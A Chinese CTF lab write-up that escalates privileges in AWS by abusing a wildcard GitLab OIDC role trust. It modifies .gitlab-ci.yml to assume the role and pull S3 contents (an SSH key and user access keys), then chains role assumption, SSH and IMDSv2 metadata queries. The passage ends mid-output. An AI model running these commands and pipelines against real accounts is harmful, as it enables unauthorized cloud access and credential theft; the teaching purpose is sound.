# 云安全CTF:  当GitLab集成与Actuator端点成为云安全的突破口-先知社区

> **来源**: https://xz.aliyun.com/news/18991  
> **文章ID**: 18991

---

## Abuse OpenID Connect and GitLab for AWS Access

[利用 GitLab OIDC 与 AWS 角色信任链实现权限提升](https://pwnedlabs.io/labs/abuse-openid-connect-and-gitlab-for-aws-access)

> **Real-world context**
>
> 通过 OpenID Connect (OIDC) 将 GitLab 与 AWS 集成时，组织通常会配置 IAM 信任策略，允许其 GitLab 组或组织下的所有存储库进行角色代入（例如，使用类似 的通配符`project_path:my-org/*`）。虽然这可以简化 CI/CD 的入门，但可能会带来严重的安全漏洞。
>
> 如果GitLab 组下的**任何**项目遭到入侵——无论是通过恶意贡献者、易受攻击的管道还是钓鱼的开发人员——攻击者都可以利用共享的 OIDC 信任来承担 AWS 角色。由于该角色被授予**组织内的任何项目**，因此攻击者无需访问最高权限或敏感的存储库——**任何低权限或休眠的存储库都可能成为可行的攻击媒介。**
>
> 以下事实加剧了这种风险：
>
> * AWS 账户 ID 是公开的，很容易被发现。
> * 无需用户交互，即可在 CI 作业中生成来自 GitLab 的 OIDC 令牌。
> * GitLab 不会在 AWS 级别强制执行细粒度的控制 -**这取决于信任策略来限制范围。**

> 为了解决这些模式的广泛滥用问题，AWS[于 2025 年 6 月更新了其 IAM 行为，](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc_secure-by-default.html)要求默认安全条件。信任共享 OIDC 提供商（例如 ）的新角色或已修改的角色必须验证**和 等**`gitlab.com` **声明**`sub aud`，否则 API 调用将失败。

入口只给了一个AK/SK

![](images/20250924165253-db726a8c-9923-1.png)

### 初始信息收集

`aws sts get-caller-identity`查看一下当前的用户信息

```
{
    "UserId": "AIDAYLH5JA4JLMXUMN2OK",
    "Account": "573909305106",
    "Arn": "arn:aws:iam::573909305106:user/pentester"
}
```

然后运行`aws iam list-attached-user-policies --user-name pentester`与`aws iam list-user-policies --user-name pentester`想要查看一下当前用户有什么托管策略和内联策略

```
yliken@LAPTOP-40PQI58C:~/aws$ aws iam list-attached-user-policies --user-name pentester

An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam::573909305106:user/pentester is not authorized to perform: iam:ListAttachedUserPolicies on resource: user pentester because no identity-based policy allows the iam:ListAttachedUserPolicies action

yliken@LAPTOP-40PQI58C:~/aws$ aws iam list-user-policies --user-name pentester

An error occurred (AccessDenied) when calling the ListUserPolicies operation: User: arn:aws:iam::573909305106:user/pentester is not authorized to perform: iam:ListUserPolicies on resource: user pentester because no identity-based policy allows the iam:ListUserPolicies action
```

但是当前用户并没有查看这些策略的权限

可以使用开源命令行工具[CloudFox](https://github.com/BishopFox/cloudfox)来获取此 AWS 环境中的态势感知。并获取尽可能多的信息以查找潜在的攻击路径和错误配置。

> CloudFox 是由 Bishop Fox 团队开发的开源云安全评估工具。它能够自动收集和分析云环境中的资源信息、IAM 用户和角色，并进行权限分析和潜在权限提升检测。虽然主要针对 AWS 平台，但它也支持对其他云平台的安全评估，帮助安全专业人员快速识别跨云环境中的风险。

![](images/20250924165253-dbbe19d4-9923-1.png)

扫描完成之后就会将结果保存到家目录下

![](images/20250924165254-dbea73f8-9923-1.png)

这里我们只关心用户权限的结果

除了AWS管理账户外有三个用户`bob` `louise` `pentester`

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/573909305106$ cat 573909305106-iam-ListUsers.json
{
  "Value": [
    {
      "Arn": "arn:aws:iam::573909305106:user/awsmanagementuser",
      "CreateDate": "2023-12-19T08:57:11Z",
      "Path": "/",
      "UserId": "AIDAYLH5JA4JO26LTNAGY",
      "UserName": "awsmanagementuser",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:user/bob",
      "CreateDate": "2025-09-22T09:01:45Z",
      "Path": "/",
      "UserId": "AIDAYLH5JA4JGSGBS7WNN",
      "UserName": "bob",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:user/louise",
      "CreateDate": "2025-09-22T09:01:45Z",
      "Path": "/",
      "UserId": "AIDAYLH5JA4JJROTE6J5D",
      "UserName": "louise",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:user/pentester",
      "CreateDate": "2025-09-22T09:01:45Z",
      "Path": "/",
      "UserId": "AIDAYLH5JA4JLMXUMN2OK",
      "UserName": "pentester",
      "PasswordLastUsed": null,
      "PermissionsBoundary": null,
      "Tags": null
    }
  ],
  "Exp": 1758546399764764091
}
```

除了AWS内置的角色之外

还有`engineering` `gitlab_terraform_deploy` `OrganizationAccountAccessRole`这是哪个角色

`engineering` 显示 `bob` 和 `louise` 可以扮演此角色

`gitlab_terraform_deploy`允许 GitLab 通过 OIDC Web Identity Token 扮演角色

`OrganizationAccountAccessRole`允许 AWS Organizations 根账号或主账号跨账户访问

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/573909305106$ cat 573909305106-iam-ListRoles.json
{
  "Value": [
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/access-analyzer.amazonaws.com/AWSServiceRoleForAccessAnalyzer",
      "CreateDate": "2025-09-06T20:25:28Z",
      "Path": "/aws-service-role/access-analyzer.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JKC3T6CCB4",
      "RoleName": "AWSServiceRoleForAccessAnalyzer",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22access-analyzer.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": null,
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/ops.apigateway.amazonaws.com/AWSServiceRoleForAPIGateway",
      "CreateDate": "2025-08-11T14:51:28Z",
      "Path": "/aws-service-role/ops.apigateway.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JLLW22QCUP",
      "RoleName": "AWSServiceRoleForAPIGateway",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22ops.apigateway.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": "The Service Linked Role is used by Amazon API Gateway.",
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/cost-optimization-hub.bcm.amazonaws.com/AWSServiceRoleForCostOptimizationHub",
      "CreateDate": "2024-03-20T04:56:14Z",
      "Path": "/aws-service-role/cost-optimization-hub.bcm.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JNQXWH533U",
      "RoleName": "AWSServiceRoleForCostOptimizationHub",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22cost-optimization-hub.bcm.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": null,
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations",
      "CreateDate": "2023-06-08T08:09:22Z",
      "Path": "/aws-service-role/organizations.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JHLJABCMDM",
      "RoleName": "AWSServiceRoleForOrganizations",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22organizations.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": "Service-linked role used by AWS Organizations to enable integration of other AWS services with Organizations.",
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/servicequotas.amazonaws.com/AWSServiceRoleForServiceQuotas",
      "CreateDate": "2023-06-08T08:19:24Z",
      "Path": "/aws-service-role/servicequotas.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JMCY4HW6L5",
      "RoleName": "AWSServiceRoleForServiceQuotas",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22servicequotas.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": "A service-linked role is required for Service Quotas to access your service limits.",
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/sso.amazonaws.com/AWSServiceRoleForSSO",
      "CreateDate": "2023-06-08T08:09:37Z",
      "Path": "/aws-service-role/sso.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JM6Q5JNBQI",
      "RoleName": "AWSServiceRoleForSSO",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22sso.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": "Service-linked role used by AWS SSO to manage AWS resources, including IAM roles, policies and SAML IdP on your behalf.",
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport",
      "CreateDate": "2023-06-08T08:09:21Z",
      "Path": "/aws-service-role/support.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JIRM64BLIF",
      "RoleName": "AWSServiceRoleForSupport",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22support.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": "Enables resource access for AWS to provide billing, administrative and support services",
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor",
      "CreateDate": "2023-06-08T08:09:21Z",
      "Path": "/aws-service-role/trustedadvisor.amazonaws.com/",
      "RoleId": "AROAYLH5JA4JLX6QJ2OBY",
      "RoleName": "AWSServiceRoleForTrustedAdvisor",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22trustedadvisor.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": "Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.",
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/engineering",
      "CreateDate": "2025-09-22T09:02:01Z",
      "Path": "/",
      "RoleId": "AROAYLH5JA4JHE7D3U2FW",
      "RoleName": "engineering",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Sid%22%3A%22AllowEngineersToAssumeRole%22%2C%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22AWS%22%3A%5B%22arn%3Aaws%3Aiam%3A%3A573909305106%3Auser%2Flouise%22%2C%22arn%3Aaws%3Aiam%3A%3A573909305106%3Auser%2Fbob%22%5D%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": null,
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/gitlab_terraform_deploy",
      "CreateDate": "2025-09-22T09:01:45Z",
      "Path": "/",
      "RoleId": "AROAYLH5JA4JBH2BE6EHN",
      "RoleName": "gitlab_terraform_deploy",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Sid%22%3A%22AllowGitLabFromHugeLogistics%22%2C%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Federated%22%3A%22arn%3Aaws%3Aiam%3A%3A573909305106%3Aoidc-provider%2Fgitlab.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRoleWithWebIdentity%22%2C%22Condition%22%3A%7B%22StringEquals%22%3A%7B%22gitlab.com%3Aaud%22%3A%22https%3A%2F%2Fgitlab.com%22%7D%2C%22StringLike%22%3A%7B%22gitlab.com%3Asub%22%3A%22project_path%3Ahuge-logistics%2F%2A%22%7D%7D%7D%5D%7D",
      "Description": null,
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    },
    {
      "Arn": "arn:aws:iam::573909305106:role/OrganizationAccountAccessRole",
      "CreateDate": "2023-06-08T08:09:21Z",
      "Path": "/",
      "RoleId": "AROAYLH5JA4JJSOWUXT4K",
      "RoleName": "OrganizationAccountAccessRole",
      "AssumeRolePolicyDocument": "%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22AWS%22%3A%22arn%3Aaws%3Aiam%3A%3A036528129738%3Aroot%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D",
      "Description": null,
      "MaxSessionDuration": 3600,
      "PermissionsBoundary": null,
      "RoleLastUsed": null,
      "Tags": null
    }
  ],
  "Exp": 1758546400320609754
}
```

### 发现攻击路径：GitLab OIDC 信任角色

可以使用 `aws iam get-role --role-name gitlab_terraform_deploy` 命令获取到该 IAM 角色的详细信息，包括角色 ARN、创建时间、权限策略、信任关系等。

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/573909305106$ aws iam get-role --role-name gitlab_terraform_deploy
{
    "Role": {
        "Path": "/",
        "RoleName": "gitlab_terraform_deploy",
        "RoleId": "AROAYLH5JA4JBH2BE6EHN",
        "Arn": "arn:aws:iam::573909305106:role/gitlab_terraform_deploy",
        "CreateDate": "2025-09-22T09:01:45+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AllowGitLabFromHugeLogistics",
                    "Effect": "Allow",
                    "Principal": {
                        "Federated": "arn:aws:iam::573909305106:oidc-provider/gitlab.com"
                    },
                    "Action": "sts:AssumeRoleWithWebIdentity",
                    "Condition": {
                        "StringEquals": {
                            "gitlab.com:aud": "https://gitlab.com"
                        },
                        "StringLike": {
                            "gitlab.com:sub": "project_path:huge-logistics/*"
                        }
                    }
                }
            ]
        },
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {}
    }
}
```

该 IAM 角色 `gitlab_terraform_deploy` 专门为 GitLab CI/CD 配置，允许 GitLab 项目通过 OIDC 身份验证临时扮演该角色执行操作。角色信任策略限制了访问主体为 GitLab 的 OIDC 提供者，并仅允许 `huge-logistics` 下的项目使用，同时要求 token 的 audience 为 `https://gitlab.com`。角色最大会话时长为 1 小时，用于控制临时凭证的有效期，从而保证安全性和最小权限原则。

> 在 AWS 中，OIDC提供商允许外部身份验证用户代入 IAM 角色，从而实现身份联合。

> **什么是 OpenID Connect (OIDC)？**
>
> 这是一个基于 OAuth 2.0 构建的身份验证协议，允许应用程序根据身份提供商 (IdP) 执行的身份验证来验证用户身份。在 AWS 中，OIDC 通常用于集成第三方身份提供商（例如 Google、Okta、GitLab 或 GitHub）以承担 AWS IAM 角色并访问 AWS 资源。

### 利用 GitLab CI/CD 获取临时凭证

同时题中还提供了一个gitlab账户

该账户中有一个代码仓库是属于`huge-logistics`组的

我们可以进入到这个仓库`settings -> CI/CD -> Variables`

![](images/20250924165254-dc33aec6-9923-1.png)

然后加上三个变量

![](images/20250924165254-dc71fcc6-9923-1.png)

![](images/20250924165255-dc9cc670-9923-1.png)

![](images/20250924165255-dcc453f4-9923-1.png)

![](images/20250924165255-dd08e17a-9923-1.png)

然后在代码仓库中选择WEBIDE对仓库中的`.gitlab-ci.yml`内容进行修改

![](images/20250924165256-dd46ed94-9923-1.png)

将`.gitlab-ci.yml`内容修改成

```
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws sts get-caller-identity
```

之后将它推送到main分支

![](images/20250924165256-dd7fb668-9923-1.png)

> `.gitlab-ci.yml` 是 **GitLab CI/CD** 的核心配置文件，用于定义项目的 **自动化流程**（Pipeline）。它通常放在项目根目录下。该文件的作用有 定义 Pipeline、 自动化构建/测试/部署、 统一管理 DevOps 流程。

然后导航到`build -> Jobs`中就可以看到运行日志了

![](images/20250924165257-ddd1b2e4-9923-1.png)

我们已经成功的承担了gitlab\_terraform\_deploy 角色

再将`.gitlab-ci.yml`文件的内容改成

```
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws s3 ls
```

推送到main之后在看日志的话是可以看到有一个`huge-logistics-engineering-db3ba0baab43`存储桶的

![](images/20250924165257-de11d49e-9923-1.png)

然后修改`.gitlab-ci.yml`文件的`script`部分。 改成`aws s3 ls s3://huge-logistics-engineering-db3ba0baab43`来查看桶中内容

![](images/20250924165258-de540776-9923-1.png)

修改`.gitlab-ci.yml`文件

```
variables:
  AWS_DEFAULT_REGION: us-east-1
  AWS_PROFILE: "oidc"

oidc:
  image:
    name: amazon/aws-cli:latest
    entrypoint: [""]
  id_tokens:
    GITLAB_OIDC_TOKEN:
      aud: https://gitlab.com
  script:
    - aws s3 sync s3://huge-logistics-engineering-db3ba0baab43/ .
  artifacts:
    paths:
      - backup.txt
      - ec2.pem
```

在构建完成后 可以在日志页面下载桶中内容

![](images/20250924165258-dea98a48-9923-1.png)

在`backup.txt`中有着`louise`用户的AKsK

![](images/20250924165259-ded92e10-9923-1.png)

地区信息可以curl访问刚才的存储桶获得

![](images/20250924165259-defade5c-9923-1.png)

### 横向移动：从 louise 到 engineering 角色

配置好AKSK之后执行`aws sts get-caller-identity`我们现在已经获取到了louise的权限

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/573909305106$ aws sts get-caller-identity --profile louise
{
    "UserId": "AIDA3G7WQODFNVB5QKQ7M",
    "Account": "770926735562",
    "Arn": "arn:aws:iam::770926735562:user/louise"
}
```

查看一下权限策略

```
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/573909305106$ aws iam list-attached-user-policies --user-name louise
--profile louise
{
    "AttachedPolicies": [
        {
            "PolicyName": "ViewIamPermissions",
            "PolicyArn": "arn:aws:iam::770926735562:policy/ViewIamPermissions"
        }
    ]
}
yliken@LAPTOP-40PQI58C:~/.cloudfox/cached-data/aws/573909305106$ aws iam list-user-policies --user-name louise --profile
 louise
{
    "PolicyNames": []
}
```

前面提到 `bob` 和 `louise` 可以扮演 `engineering` 这个角色

承担engineering这个角色 `aws sts assume-role --role-arn arn:aws:iam::770926735562:role/engineering --role-session-name newlouise --profile louise`

```
yliken@LAPTOP-40PQI58C:/mnt/c/Users/legion/Downloads/artifacts (2)$ aws sts assume-role --role-arn arn:aws:iam::770926735562:role/engineering --role-session-name newlouise --profile louise
{
    "Credentials": {
        "AccessKeyId": "AS****111FI7PKFWHY",
        "SecretAccessKey": "ERalyD25XvVxxkhWqHGRW8oHH",
        "SessionToken": "IQoJb3JpZ2luX2VjEKb//////////wEaCXVzLXdlc3QtMiJHMEUCIC7JKdJKJxJF5FcuqE2TnJcKLcx7IojyCuct68zIyW+QAiEAw2IIWhXl7OgfSJC6ofGEkgqcxm+uYePzMZEpHKn1jfcqlgIILhAAGgw3NzA5MjY3MzU1NjIiDHdnUEHHG+bBGDfTWyrzAWYQGMHFHDmfzT0fjCzOEISFHQXdu6Yv5CRMz4JEyd6gfM1xdCGDmByZXM0O3edIVo07RG7ZNeHTEm//O9rYbw6EbY65Sn5ezJ5q/n16+eJosn101K13wyLj1cJO66rffX4gfa/h45mceDD4q2xZ3zVfTJU1qPENpn2tU28p8W24yyiqmNxmZxYcPdYeB+vVCpdJSkvy1iABSqsmpcMOgzzQl+t4Ys1mpNPE8xAZST+uaYeJI9gQhLtFmu40NYCzJ2BpK+vXZoIwZlv3BqOLBP43IWueEM1UyN3UX2yM4ZZ40mH4hL99NKORGxNMT6BmHe2xdTD0mcXGBjqdAbuhCFDPUYTn7G05nm2Lg2WKDUC1JjT7lxZtwmx4cpm9o0d5Unc2MeDmvmnaqAp3Xp62QZfnqT99GNzTIdTqOa9ElV1oMTxgzruSGBEminfLNzvJWktx/uc+j/dg1y4xkhTV/esHghOtpdggLQZ5pbGQIkpi5jSaw9m0nCSsV20qTbaTPxLNqomydTRgEcCT1UXB9vV76zBLM4nYAWc=",
        "Expiration": "2025-09-22T14:19:48+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROA3G7WQODFI66VGN24Q:newlouise",
        "Arn": "arn:aws:sts::770926735562:assumed-role/engineering/newlouise"
    }
}
```

配置好AKSK之后 ,确实我们已经成功承担了该角色

```
yliken@LAPTOP-40PQI58C:/mnt/c/Users/legion/Downloads/artifacts (2)$ aws sts get-caller-identity --profile newlouise
{
    "UserId": "AROA3G7WQODFI66VGN24Q:newlouise",
    "Account": "770926735562",
    "Arn": "arn:aws:sts::770926735562:assumed-role/engineering/newlouise"
}
```

### 进一步渗透：获取 bob 的凭证

然后使用aws-enumerator枚举一下权限

![](images/20250924165259-df2d4c34-9923-1.png)

![](images/20250924165259-df4b449e-9923-1.png)

```
yliken@LAPTOP-40PQI58C:~/go/bin$ aws ec2 describe-instances --region us-west-2 --profile newlouise
{
    "Reservations": [
        {
            "ReservationId": "r-0392ffd1379b98a0a",
            "OwnerId": "770926735562",
            "Groups": [],
            "Instances": [
                {
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2025-09-22T12:50:00+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-078c7ed406d82ff80"
                            }
                        }
                    ],
                    "ClientToken": "terraform-20250922124958944100000006",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "NetworkInterfaces": [
                        {
                            "Attachment": {
                                "AttachTime": "2025-09-22T12:49:59+00:00",
                                "AttachmentId": "eni-attach-051bc8df53a9682e4",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupId": "sg-02bfdf237bd43e0a7",
                                    "GroupName": "Child Two Internal SG"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "06:82:e0:17:b3:61",
                            "NetworkInterfaceId": "eni-0ba9c90918846a458",
                            "OwnerId": "770926735562",
                            "PrivateDnsName": "ip-10-1-20-57.us-west-2.compute.internal",
                            "PrivateIpAddress": "10.1.20.57",
                            "PrivateIpAddresses": [
                                {
                                    "Primary": true,
                                    "PrivateDnsName": "ip-10-1-20-57.us-west-2.compute.internal",
                                    "PrivateIpAddress": "10.1.20.57"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-06a9cf60bde2ecd54",
                            "VpcId": "vpc-0453fadd63f4de860",
                            "InterfaceType": "interface",
                            "Operator": {
                                "Managed": false
                            }
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupId": "sg-02bfdf237bd43e0a7",
                            "GroupName": "Child Two Internal SG"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Tags": [
                        {
                            "Key": "Name",
                            "Value": "OIDC"
                        }
                    ],
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 1
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "required",
                        "HttpPutResponseHopLimit": 2,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "BootMode": "uefi-preferred",
                    "PlatformDetails": "Linux/UNIX",
                    "UsageOperation": "RunInstances",
                    "UsageOperationUpdateTime": "2025-09-22T12:49:59+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default",
                        "RebootMigration": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios",
                    "NetworkPerformanceOptions": {
                        "BandwidthWeighting": "default"
                    },
                    "Operator": {
                        "Managed": false
                    },
                    "InstanceId": "i-08340f4fffab9324a",
                    "ImageId": "ami-0e53341489b04c826",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "PrivateDnsName": "ip-10-1-20-57.us-west-2.compute.internal",
                    "PublicDnsName": "",
                    "StateTransitionReason": "",
                    "AmiLaunchIndex": 0,
                    "ProductCodes": [],
                    "InstanceType": "t2.micro",
                    "LaunchTime": "2025-09-22T12:49:59+00:00",
                    "Placement": {
                        "AvailabilityZoneId": "usw2-az2",
                        "GroupName": "",
                        "Tenancy": "default",
                        "AvailabilityZone": "us-west-2a"
                    },
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "SubnetId": "subnet-06a9cf60bde2ecd54",
                    "VpcId": "vpc-0453fadd63f4de860",
                    "PrivateIpAddress": "10.1.20.57"
                }
            ]
        }
    ]
}
```

存在一台主机`10.1.20.57`

然后就可以使用从gitlab获取到的密钥文件登录到机器上面

![](images/20250924165300-df71e3d0-9923-1.png)

在这台主机上面并没有找到有用的信息

接下来可以尝试访问aws的元数据中心

```
louise@ip-10-1-20-57:~$ curl http://169.254.169.254/latest/meta-data
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
 <head>
  <title>401 - Unauthorized</title>
 </head>
 <body>
  <h1>401 - Unauthorized</h1>
 </body>
</html>
```

收到 401 未授权错误，则表示 IMDSv2 已启用。IMDSv1 不需要身份验证。

![](images/20250924165300-df9453c0-9923-1.png)

在`DescribeInstances`之前操作的输出中也可以验证这一点。

```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

![](images/20250924165300-dfbabca4-9923-1.png)

> Instance Metadata Service v2（IMDSv2）是 AWS 为 EC2 实例元数据访问引入的更安全的版本，用来减少通过 SSRF 等漏洞窃取实例临时凭证的风险。与早期的 IMDSv1 不同，IMDSv2 采用基于会话的访问：客户端先向 `http://169.254.169.254/latest/api/token` 发起一次 `PUT` 请求并携带 `X-aws-ec2-metadata-token-ttl-seconds` 以获取短期 session token，随后所有 metadata 请求都必须在头部带上 `X-aws-ec2-metadata-token: <token>`。这种两步走的设计（需要自定义方法和头部）以及可配置的 hop limit 大幅降低了简单 GET-only SSRF 的攻击成功率。虽然不是对所有高级攻击都万无一失，但 IMDSv2 显著提高了实用安全性；生产环境推荐通过实例元数据选项将 `http-tokens` 设为 `required`，强制只接受 IMDSv2 请求。

输出中没有`iam`类别，因此该实例没有附加 IAM 实例角色。可以尝试检查一下`user-data`

```
louise@ip-10-1-20-57:~$ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56  100    56    0     0  30888      0 --:--:-- --:--:-- --:--:-- 56000
--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
